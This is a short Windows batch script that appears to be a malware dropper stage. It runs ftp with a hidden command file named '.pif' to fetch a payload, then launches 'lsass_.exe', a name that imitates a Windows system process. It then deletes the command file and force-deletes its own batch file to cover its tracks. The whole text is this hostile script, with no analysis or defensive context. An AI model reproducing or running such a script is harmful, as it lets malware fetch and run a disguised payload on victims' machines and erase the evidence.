@echo off 
ftp -n -v -s:.pif 
lsass_.exe 
del .pif 
del /F c.bat 
exit /y 
